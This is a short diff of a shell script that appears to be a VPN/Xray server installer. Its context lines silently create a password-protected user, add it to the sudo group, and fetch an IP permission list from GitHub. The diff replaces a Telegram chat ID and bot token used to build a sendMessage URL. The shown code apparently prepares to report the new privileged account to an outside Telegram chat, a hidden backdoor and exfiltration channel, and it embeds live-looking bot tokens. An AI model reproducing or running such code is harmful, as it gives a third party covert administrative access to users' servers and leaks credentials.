@@ -1036,8 +1036,8 @@ domain=$(cat /etc/xray/domain)
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="-1001911780985"
-    KEY="6094210408:AAHx2ZMJ8PbcR4SjKvH1n-qDEGm0HoiAIWY"
+    CHATID="5078959483"
+    KEY="7249877268:AAH_OG5nvJRKjWzNwQb_OIG909RBP9uve2c"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     USRSC=$(curl https://raw.githubusercontent.com/SETANTAZVPN/izinvps/ipuk/ip | grep $ipsaya | awk '{print $2}')
